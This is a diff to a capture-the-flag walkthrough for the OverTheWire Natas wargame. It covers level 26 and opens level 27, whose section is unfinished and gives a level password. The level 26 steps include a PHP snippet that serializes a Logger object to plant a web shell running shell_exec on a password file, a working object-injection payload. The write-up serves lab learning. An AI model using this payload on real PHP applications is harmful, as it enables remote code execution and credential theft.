@@ -1140,3 +1140,59 @@ http://natas24.natas.labs.overthewire.org/?passwd[]=test
 > Solution Steps
 
 1. Initial Observation
+
+2. Understand the challenge
+
+3. Burp Suite
+
+4. Capture the request in Burp Proxy
+
+5. Send to Repeater
+
+6. Analyze Response in Repeater
+
+![image](images/image26.png)
+
+7. place the phpsessionid from burpsuite in the url
+
+![image](images/image-26.png)
+
+8. use php sandbox online compiler to get the drawing result 
+
+<?php
+
+class Logger{
+    private $logFile;
+    private $exitMsg;
+
+    function __construct(){
+        $this->exitMsg= "<?php echo shell_exec('cat /etc/natas_webpass/natas27'); ?>";
+        $this->logFile = "/var/www/natas/natas26/img/natas26_r3a6vv0ma1pmmaiqb55gj4f5b7.php";
+    }
+}
+
+$logger = new Logger();
+echo base64_encode(serialize($logger));
+
+![image](images/image--26.png)
+
+9. paste those result in drawing value    - click ctrl+shift+i
+
+![image](images/image-!26.png)
+
+!![image](images/image-!!26.png)
+
+# Level 27 - 28
+
+> Level Information
+
+- **URL**: `http://natas27.natas.labs.overthewire.org`
+- **Username**: `natas27`
+- **Password**: u3RRffXjysjgwFU6b9xa23i6prmUsYne
+- **Goal**: Find the password for natas28
+
+> Solution Steps
+
+1. Initial Observation
+
+2. Understand the challenge
